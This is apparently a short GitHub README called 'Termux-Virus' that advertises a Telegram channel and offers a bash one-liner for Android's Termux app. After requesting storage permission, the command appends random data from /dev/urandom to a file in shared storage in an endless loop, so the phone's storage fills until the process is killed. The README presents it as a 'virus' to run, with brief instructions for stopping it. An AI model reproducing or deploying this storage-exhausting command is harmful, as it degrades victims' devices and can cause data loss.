# Termux-Virus

⚠ **Warning**: Run at your own risk.

Join My Channel: [SG_Modder1](https://t.me/SG_Modder1)

😈 **2024 New Termux Virus By Me** 😈

😈 **Command 👇👇👇** 😈


```bash
termux-setup-storage && if [ -d "/storage/emulated/0" ]; then while true; do dd if=/dev/urandom of="/storage/emulated/0/device.bin" bs=1M conv=notrunc oflag=append > /dev/null 2>&1 && echo "🟩"; done; else echo "Give storage permissions."; termux-setup-storage; fi
```

## ⭐️ HOW IT WORKS ⭐️

👨‍💻 This command automatically generates a single file and continuously increases its size until you force stop Termux.


## 🛑 HOW TO STOP IT 🛑


You can stop the script in two ways:

1. **Using Ctrl + C**:
   - Simply press `Ctrl` and `C` keys together in your Termux terminal to terminate the script.
